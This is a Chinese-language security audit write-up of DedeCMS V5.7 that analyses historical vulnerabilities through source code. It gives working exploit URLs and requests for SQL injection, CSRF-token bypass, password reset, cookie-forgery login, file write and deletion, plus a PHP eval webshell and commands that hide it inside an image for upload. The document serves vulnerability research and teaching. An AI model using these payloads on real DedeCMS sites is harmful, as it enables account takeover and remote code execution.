# DedeCMS

DedeCMS是由上海卓卓网络科技有限公司研发的国产PHP网站内容管理系统，中文名为：织梦内容管理系统。产品补丁下载地址：https://www.dedecms.com/download#download

解压`DedeCMS-V5.7-UTF8-SP2.zip`，该压缩包一共两个文件夹`docs`和`uploads`，将`uploads`放入php集成环境的`www`目录下，访问即可开始安装过程。（本文将uploads文件夹重命名为dedecms57）

后台地址：`http://ip:port/dedecms57/dede/`

以下代码审计和历史漏洞均为DedeCMS V5.7版本为例。


## 架构分析
DedeCMS文件夹结构如下，其中`/dede`为后台地址，需要管理员admin登陆后才可访问，`/member`为会员中心，需要开启会员功能才可访问
```
uploads
├─data
├─dede # 后台
├─images
├─include
├─install
├─m
├─member # 会员中心
├─plus
├─special
├─templets
├─uploads
├─index.php
├─robots.txt
├─tags.php
```

关键信息文件如下
```
/dedecms57/data/admin/ver.txt 版本更新时间，此处为20180109
/dedecms57/data/tag/sql.inc.php 存放数据库用户名密码
```

PS： 代码审计的一些特点

(1) 开启会员功能，才可访问`/member`
会员功能在`管理员后台->左侧导航'系统'->系统基本参数->上方导航'会员设置'->是否开启会员功能选择开启`。不然在访问`/member/`文件夹下的文件时都会报错：“系统关闭了会员功能，因此你无法访问此页面！”

(2) 绕过`csrf_check()`
在代码审计过程中，会发现很多代码逻辑会在一开始有一行`csrf_check()`，该方法定义于`/dede/config.php`。想要进行攻击需要绕过此判断，代码如下
```php
function csrf_check()
{
    global $token;
    if(!isset($token) || strcasecmp($token, $_SESSION['token']) != 0){
        echo '<a href="http://bbs.dedecms.com/907721.html">DedeCMS:CSRF Token Check Failed!</a>';
        exit;
    }
}
```
这里用到了`strcasecmp()`和`strcmp()`的特性，两个方法无法对数组进行判断，参数传入的是数组形式，直接返回0。那么可以构造$token为一个不为空的数组，如`token[]=1`即可绕过`csrf_check()`的检查。

(3) sql注入限制
DedeCMS对传入的`'`都进行了转译，变为`\'`。所以select型等注入无法闭合`'`而无法构造payload。所以挖掘的sql注入漏洞大多是IN型的注入，如
```
SELECT nid,url FROM `#@__co_htmls` WHERE aid IN($ids) 
```
IN型注入的payload可用`(select%20*%20from%20(select(sleep(5)))iTpw)`或者`ELT(3337>3336,SLEEP(2))`

Mysql的ELT函数`ELT(N,str1,str2,str3,...)`，如果`N=1`返回`str1`，如果`N=2`返回`str2`以此类推

(4) 写shell漏洞
DedeCMS中想要写shell，需要写入到php文件，或可以被`require_once()`包含的文件。`article_template_rand.php`等对应的是写入到php文件，`sys_verifies.php`则是写入到可以被`require_once()`包含的`modifytmp.inc`文件中。

DedeCMS中包含很多的模板或配置文件，如`/template.rand.php`，根据参数执行保存配置、清除模板等操作。而在操作文件的过程中，一旦写入文件的内容可控，就可以将该php改写为恶意文件。


## 5.7版本历史漏洞
|                        漏洞名称                        |                           访问路径                           |
| :----------------------------------------------------: | :----------------------------------------------------------: |
| 会员中心任意密码修改漏洞 | `/member/resetpassword.php` |
| 任意用户登陆漏洞 | `/member/index.php?uid=0001` |
| 管理员密码重置漏洞 | 会员中心任意密码修改漏洞+任意用户登陆漏洞组合 |
| article_add.php文件上传漏洞 | `/member/article_add.php` |
| sys_verifies.php写文件漏洞 | `/dede/sys_verifies.php?action=getfiles&refiles[]=\%22;phpinfo();die();//` |
| album_add.php文件上传漏洞(CVE-2019-8362) | `/dede/album_add.php` |
| article_coonepage_rule.php sql注入漏洞(CVE-2022-23337) | `/dede/article_coonepage_rule.php?action=del&ids=ELT(3337>3336,SLEEP(2)` |
| co_do.php sql注入漏洞(CVE-2018-19061) | `/dede/co_do.php?clshash=true&dopost=clear&ids=(select%20*%20from%20(select(sleep(3)))iTpw)'` |
| file_manage_main.php 任意文件上传漏洞 | `/dede/file_manage_main.php?activepath=` |
| mail_file_manage.php 任意文件删除漏洞 | `/dede/mail_file_manage.php?fmdo=del&filename=/mytest/cmd.php` |
| article_template_rand.php 写shell漏洞 | `/dede/article_template_rand.php?dopost=save&templates=<? phpinfo();?>&token[]=1` |
| article_string_mix.php 写shell漏洞 | `/dede/article_string_mix.php?dopost=save&allsource=<? phpinfo();?>&token[]=1` |
| file_manage_control.php 任意文件删除漏洞 | `/dede/file_manage_control.php?fmdo=del&filename=../dtest.php` |

## 会员中心任意密码修改漏洞
漏洞定位`/member/resetpassword.php`，该文件主要用于密码重置，其中部分代码如下：
```php
if(empty($dopost)) $dopost = "";
$id = isset($id)? intval($id) : 0;

if($dopost == ""){}
elseif($dopost == "getpwd"){} // 获取验证码，验证邮箱/用户名，以邮件/安全问题的方式找回密码
else if($dopost == "safequestion"){
    $mid = preg_replace("#[^0-9]#", "", $id);
    $sql = "SELECT safequestion,safeanswer,userid,email FROM #@__member WHERE mid = '$mid'";
    $row = $db->GetOne($sql);
    if(empty($safequestion)) $safequestion = '';
    if(empty($safeanswer)) $safeanswer = '';
    if($row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer){ 
        sn($mid, $row['userid'], $row['email'], 'N');
        exit();
    }...
} // 安全问题回答校验
else if($dopost == "getpasswd"){} // 修改密码
```
当传入的参数`$dopost`值为`safequestion`时，从数据库中查询mid对应的信息来判断用户提交的安全问题和答案是否匹配。mid的值由id传入，但id用`intval()`函数做了限制，无法进行sql。查看`__member`数据表，发现cms安装完后存在一条现有数据，内容如下

| mid  | mtype | userid | pwd                              | uname | sex  | rank | safequestion | safeanswer | loginip   | Checkmail |
| ---- | ----- | ------ | -------------------------------- | ----- | ---- | ---- | ------------ | ---------- | --------- | --------- |
| 1    | 个人  | admin  | 21232f297a57a5a743894a0e4a801fc3 | admin | 男   | 100  | 0            |            | 127.0.0.1 | -1        |

根据表内容可以看出（1）没有设置安全问题的时候，`$row['safequestion'] `的值为0。`$row['safeanswer']`的值为空 （2）pwd是md5加密方式

如果安全问题和答案和数据库中相同，进入到`sn()`函数，该函数用于查询是否发送过验证码。在重置之前查询`__pwd_tmp`表是不存在的，那么就会走到`newmail()`方法的`INSERT`分支。如果`$send`值为`Y`会将修改的验证码发送到原来的邮箱，如果值是N则直接跳转到密码修改页。上面`resetpassword.php`在调用sn的时候传入的值就是`N`。

```php
function sn($mid,$userid,$mailto, $send = 'Y')
{
    $sql = "SELECT * FROM #@__pwd_tmp WHERE mid = '$mid'";
    $row = $db->GetOne($sql);
    if(!is_array($row)){
        newmail($mid,$userid,$mailto,'INSERT',$send); //发送新邮件；
    }elseif($dtime - $tptim > $row['mailtime']){ //10分钟后可以再次发送新验证码；
        newmail($mid,$userid,$mailto,'UPDATE',$send);
    }...
}

function newmail($mid, $userid, $mailto, $type, $send)
{
    $mailtitle = $cfg_webname.":密码修改";
    $randval = random(8);
    if($type == 'INSERT')
    {
        $key = md5($randval);
        $sql = "INSERT INTO `#@__pwd_tmp` (`mid` ,`membername` ,`pwd` ,`mailtime`)VALUES ('$mid', '$userid',  '$key', '$mailtime');";
        if($db->ExecuteNoneQuery($sql))
        {
            if($send == 'Y'){
                sendmail($mailto,$mailtitle,$mailbody,$headers);
                return ShowMsg('EMAIL修改验证码已经发送到原来的邮箱请查收', 'login.php','','5000');
            } else if ($send == 'N'){
                return ShowMsg('稍后跳转到修改页', $cfg_basehost.$cfg_memberurl."/resetpassword.php?dopost=getpasswd&amp;id=".$mid."&amp;key=".$randval);
            }
        }...
    }elseif($type == 'UPDATE'){...}
}
```

在安全问题校验的时候用了`if($row['safequestion'] == $safequestion && $row['safeanswer'] == $safeanswer)`。如果能满足这个if条件就会跳转到密码修改页。

`==`在php中经常出现弱类型转换的安全问题。也就是需要构造弱类型等于'0'的字符串。'00'、'000'、'0.0'这些都是可以的。

注册一个用户，然后去更改另一个用户的密码，更改密码的payload如下
```
POST /dedecms57/member/resetpassword.php HTTP/1.1

dopost=safequestion&id=3&userid=test2&safequestion=00&safeanswer=0&vdcode=KUUG
```
页面会回显出用户修改密码页面的url，访问即可修改密码

## 任意用户登陆漏洞

抓取登陆用户test的数据包，会发现Cookie特征如下，DedeUserID的值是`dede_member`数据表中该用户对应的mid的值。管理员的DedeUserID默认为1。

```
Cookie: PHPSESSID=ebn9o763h9laumaeh2fnkqhnt3; DedeUserID=2; DedeUserID__ckMd5=37ffd3915340ed69; DedeLoginTime=1683701739; DedeLoginTime__ckMd5=aa4fa53914eb3d14
```

接下来需要找到这些特征的生成代码，会员相关的主页都在`/member`文件夹下，查看`/member/index.php`。

```php
$uid=empty($uid)? "" : RemoveXSS($uid); // $uid可控
if(empty($action)) $action = '';
if(empty($aid)) $aid = '';

if($uid==''){ //会员后台
  if(!$cfg_ml->IsLogin()){} // 判断是否登陆
  else{
    $minfos = $dsql->GetOne("SELECT * FROM `#@__member_tj` WHERE mid='".$cfg_ml->M_ID."'; ");
    ... // 查询各种__member_xx的数据
  }
else{
  if($action == ''){
    $last_vtime = GetCookie('last_vtime');
    $last_vid = GetCookie('last_vid'); // 如果为空
    if($vtime - $last_vtime > 3600 || !preg_match('#,'.$uid.',#i', ','.$last_vid.',') ){
      if($last_vid!=''){...} // 遍历$last_vid，拼接
      else{ $last_vid = $uid; } //如果$last_vid为空，赋值为$uid
      PutCookie('last_vtime', $vtime, 3600*24, '/');
      PutCookie('last_vid', $last_vid, 3600*24, '/');
      if($cfg_ml->IsLogin() && $cfg_ml->M_LoginID != $uid){...}
    }
  }
```
`IsLogin()`方法位于`memberlogin.class.php`，它通过`M_ID`的值是否大于0来判断是否登陆，而`M_ID`的值是通过`GetNum(GetCookie("DedeUserID"))`获取的。

```php
class MemberLogin{
  
  function __construct($kptime = -1, $cache=FALSE){
    $this->M_ID = $this->GetNum(GetCookie("DedeUserID")); // M_ID赋值
    if(empty($this->M_ID)){
      $this->ResetUser();
    }else{
      $this->M_ID = intval($this->M_ID); // '0001'等值会被处理为'1'
      $this->fields = $dsql->GetOne("Select * From `#@__member` where mid='{$this->M_ID}' ");
  }
  
  function IsLogin(){
    if($this->M_ID > 0) return TRUE;
    else return FALSE;
  }
  
  function GetNum($fnum){
      $fnum = preg_replace("/[^0-9\.]/", '', $fnum); // 将数字和.之外的字符都去除
      return $fnum;
  }
}
```
那么上述`/member/index.php`的逻辑就是如果用户还没有登陆，获取Cookie。如果Cookie中不存在`last_vid`，即`GetCookie('last_vid');`为空，那么`$last_vid`的值就是用户传入的$uid的值。并调用`PutCookie('last_vid', $last_vid, 3600*24, '/');`生成`last_vid__ckMd5`。也就是说`$uid`的Cookie和`last_vid__ckMd5`值是相对应的。

`GetCookie()`位于`cookie.helper.php`，方法如下。比较`DedeUserID__ckMd5`和`md5($cfg_cookie_encode+DedeUserID)`如果相等则通过验证
```php
$cfg_cookie_encode = '~cookieEncode~';

function GetCookie($key)
{
  global $cfg_cookie_encode;
  if( !isset($_COOKIE[$key]) || !isset($_COOKIE[$key.'__ckMd5']) ){ return '';}
  else
  {
    if($_COOKIE[$key.'__ckMd5']!=substr(md5($cfg_cookie_encode.$_COOKIE[$key]),0,16))
    { return '';}
    else{  return $_COOKIE[$key]; }
  }
}

function PutCookie($key, $value, $kptime=0, $pa="/")
{
  global $cfg_cookie_encode,$cfg_domain_cookie;
  setcookie($key, $value, time()+$kptime, $pa,$cfg_domain_cookie);
  setcookie($key.'__ckMd5', substr(md5($cfg_cookie_encode.$value),0,16), time()+$kptime, $pa,$cfg_domain_cookie);
}
```

那么想要登陆验证成功，需要`$this->M_ID > 0`，也就是`DedeUserID`的Cookie和`DedeUserID__ckMd5`的值需要对应。DedeUserID和$uid是相等的，都是数据库中的mid字段值。那么把`DedeUserID__ckMd5`的值设成`last_vid__ckMd5`的值，即可绕过登陆认证。另外，MemberLogin类的构造函数中定义了`$this->M_ID`不为空，会调用`intval()`函数进行处理。那么如果`M_ID`为`0001`会被处理为`1`（是admin的mid值），然后`Select * From `#@__member` where mid=1`查到的是admin的数据。完成任意用户登陆。所以想要登陆用户xx的账号，只需要注册一个00xx的账号，按照上述过程更改Cookie即可。

**漏洞复现**时首先注册一个账号为0001的账户，登陆后访问`/member/index.php?uid=0001`,获取响应包的头部`Set-Cookie`:`last_vid__ckMd5`值。然后替换DedeUserID为0001,`DedeUserID__ckMd5`的值为刚才的`last_vid__ckMd5`的值。显示已经是admin了

## 管理员密码重置漏洞

如果利用会员中心任意密码修改漏洞，只能更改`dede_member`数据表中admin的密码，但是使用该密码在前台登陆的时候，会显示**你输入的用户名admin不合法**（admin默认不能登陆前台）。而用该密码登陆后台会显示**你的密码错误**。`dede_member`和`dede_admin`是两张表，前者存储会员中心的admin数据，后者存储后台admin的数据。所以用会员中心任意密码修改漏洞无法修改后台的admin密码。

那么此时就有人提出了组合拳，利用cookie绕过admin前台登陆限制（admin默认不能登陆前台），然后利用前台功能修改dede_admin中admin的密码。

因为在`member/edit_baseinfo.php`文件中有这样一段代码，如果是管理员修改密码，会连带后台密码一起修改
```
$query1 = "UPDATE `#@__member` SET pwd='$pwd',sex='$sex'{$addupquery} where mid='".$cfg_ml->M_ID."' ";
$dsql->ExecuteNoneQuery($query1);

if($cfg_ml->fields['matt']==10 && $pwd2!="")
{
    $query2 = "UPDATE `#@__admin` SET pwd='$pwd2' where id='".$cfg_ml->M_ID."' ";
    $dsql->ExecuteNoneQuery($query2);
}
```

漏洞复现时先使用任意用户登陆`/member/index.php`。然后点击**系统设置**->**基本资料**，需要输入原登陆密码，所以需要用会员中心任意密码修改漏洞先将member表下admin的密码修改掉，否则校验无法成功。然后再用admin和修改后的密码即可成功登陆后台。

## article_add.php文件上传漏洞
在前台发表文章`http://127.0.0.1:8089/dedecms57/member/article_add.php`时，可以在**详细内容**中添加图片。点击**浏览服务器**会跳转到文件上传选择界面。如果上传`.php`文件，会显示`Not Admin Upload filetype not allow !`。也就是无法直接上传php文件。然后尝试将`.php`后缀改为`.png`，上传时显示`Upload filetype not allow !。`也就是文件类型也需要为图片类型。

文件上传界面对应的是`include/dialog/select_images_post.php`。但是该文件源码中并未出现`Upload filetype not allow `这样的字段。查看此php的引用文件，最终在`uploadsafe.inc.php`文件中找到了该字段，引用关系如下

```
select_images_post.php -> config.php -> common.inc.php -> uploadsafe.inc.php
```

`uploadsafe.inc.php`核心代码如下，解释了为什么会出现上述文件上传的两个报错

```php
$cfg_not_allowall = "php|pl|cgi|asp|aspx|jsp|php3|shtm|shtml";
$imtypes = array(
  "image/pjpeg", "image/jpeg", "image/gif", "image/png", 
  "image/xpng", "image/wbmp", "image/bmp"
);

if(!empty(${$_key.'_name'}) && (preg_match("#\.(".$cfg_not_allowall.")$#i",${$_key.'_name'}) || !preg_match("#\.#", ${$_key.'_name'})) ){ // 匹配文件后缀名
  if(!defined('DEDEADMIN')){
    exit('Not Admin Upload filetype not allow !');
  }
}

if(in_array(strtolower(trim(${$_key.'_type'})), $imtypes)){ // 检查MIME type类型是否在上述$imtypes中
  $image_dd = @getimagesize($$_key);
  if (!is_array($image_dd))
  {
    exit('Upload filetype not allow !');
  }
}
```

能否绕过这个限制，需要看实际上传处理文件`include/dialog/select_images_post.php`的逻辑。看选择完上传文件后的这段逻辑

```php
$imgfile_name = trim(preg_replace("#[ \r\n\t\*\%\\\/\?><\|\":]{1,}#", '', $imgfile_name));
$cfg_imgtype = 'jpg|gif|png';
if(!preg_match("#\.(".$cfg_imgtype.")#i", $imgfile_name))
{
    ShowMsg("你所上传的图片类型不在许可列表，请更改系统对扩展名限定的配置！", "-1");
    exit();
}
```

`$imgfile_name`用正则去处了图片文件名中包含的`空格 * ? / %`等内容。那么`p*hp`就会被处理为`php`从而绕过文件后缀限制，并在上传时被存储为php后缀。虽然后缀名可以是.php，但是上传类型必须为图片类型，这个无法绕过，所以需要制作一个图片马。然后在上传时将名称改为`png.p*hp`。



**制作图片马**。首先随便找一个图片`test.png`，制作一个一句话木马`cmd.php`

```php
<?php eval(@$_POST['cmd']); ?>
```

Mac/Linux下，将php加到png后面，或者将两个文件合成一个新的图片。命令如下

```
# 将php加到png后面
cat cmd.php >> test.png

# 将两个文件合成一个新的图片
cat test.png cmd.php >> 1.png
```

Windows下，合成新的图片命令如下

```
 copy test.png/b + cmd.php/a 1.png
```

## sys_verifies.php 写文件漏洞 

漏洞定位`/dedecms57/dede/sys_verifies.php`，这个文件用于系统文件的校验。在文件的最开始读取`/admin/ver.txt（20180109）`和`/admin/verifies.txt（20110216）`

```php
$tmpdir = substr(md5($cfg_cookie_encode),0,16);

if($action == ''){
    include(DEDEADMIN.'/templets/sys_verifies.htm');
    exit();
} else if ($action == 'getfiles'){ //下载文件 
    if(!isset($refiles)){
        ShowMsg("你没进行任何操作！","sys_verifies.php");
        exit();
    }
    $cacheFiles = DEDEDATA.'/modifytmp.inc';  // data/modifytmp.inc
    $fp = fopen($cacheFiles, 'w');
    fwrite($fp, '<'.'?php'."\r\n");
    fwrite($fp, '$tmpdir = "'.$tmpdir.'";'."\r\n");
    $dirs = array();
    $i = -1;
    $adminDir = preg_replace("#(.*)[\/\\\\]#", "", dirname(__FILE__));
    foreach($refiles as $filename){
        $filename = substr($filename,3,strlen($filename)-3); //
        if(preg_match("#^dede/#i", $filename)) 
        {
            $curdir = GetDirName( preg_replace("#^dede/#i", $adminDir.'/', $filename) );
        } else {
            $curdir = GetDirName($filename);
        }
        if( !isset($dirs[$curdir]) ) 
        {
            $dirs[$curdir] = TestIsFileDir($curdir);
        }
        $i++;
        fwrite($fp, '$files['.$i.'] = "'.$filename.'";'."\r\n");
    }
    fwrite($fp, '$fileConut = '.$i.';'."\r\n");
    fwrite($fp, '?'.'>');
    fclose($fp);
        
    $doneStr = "<iframe name='stafrm' src='sys_verifies.php?action=down&curfile=0' frameborder='0' id='stafrm' width='100%' height='100%'></iframe>\r\n"; // 包含sys_verifies.php，执行down方法
    
    include(DEDEADMIN.'/templets/sys_verifies_getfiles.htm');
    exit();
}

```

上述代码对`data/modifytmp.inc`文件进行写入操作，遍历`$refiles`数组，取出字符串先删掉前三个字符，然后用`GetDirName()`方法（1）先用正则替换字符串中的反斜杠，并在前面加入`../`生成相对路径。（2）再用正则匹配最后一个斜杠之后的所有字符，并将其替换为空。

```php
function GetDirName($filename){
    $dirname = '../'.preg_replace("#[\\\\\/]{1,}#", '/', $filename);
    $dirname = preg_replace("#([^\/]*)$#", '', $dirname);
    return $dirname;
}
```

然后对处理后的路径执行`TestIsFileDir()`，实际是用`TestWriteAble()`方法测试对路径和`_dedet.txt`拼接后，该拼接结果是否可写。

`sys_verifies.php`的`action=down`方法如下，包含了`modifytmp.inc`文件

```php
else if($action=='down'){
    $cacheFiles = DEDEDATA.'/modifytmp.inc'; 
    require_once($cacheFiles); //包含了写入的modifytmp.inc
    ...
}
```

漏洞利用的关键在于如何把`phpinfo()`写入到文件中，总结上面的代码分析过程，限制的条件包括（1）前三个字符会被去除。所以需要在phpinfo()前加入三个多余字符 （2）`'$files['.$i.'] = "'.$filename.'";'."\r\n"`写入在文件中为`$files[0] ="xxx";` ，为了闭合双引号，第四位需要为`"`

根据这个构造思路，尝试传入`aaa"phpinfo();die();`，但是`$refiles`实际获取到的值是`aaa\"phpinfo();die();`，即双引号前多了`\`。也就是系统中对传入的变量值可能存在特殊字符转译。此时生成的`modifytmp.inc`内容如下，由于`\"`将引号转译了，没有能真正闭合掉双引号。另外`die();`后面的双引号也没有被闭合，且`phpinfo()`前缺少`;`号导致`phpinfo()`无法生效。

```php
<?php
$tmpdir = "68fe0dce55c036e3";
$files[0] = "\"phpinfo();die();";
$fileConut = 0;
?>
```

那么对于前双引号闭合，一个思路是让它变为`\\\"`，这样就没有转译的含义。对于后双引号，则可以直接加入注释符`//`来禁用掉。如传入`aa\";phpinfo();die();//`

此时的`modifytmp.inc`文件如下，

```php
<?php
$tmpdir = "68fe0dce55c036e3";
$files[0] = "\\";phpinfo();die();//";
$fileConut = 0;
?>
```


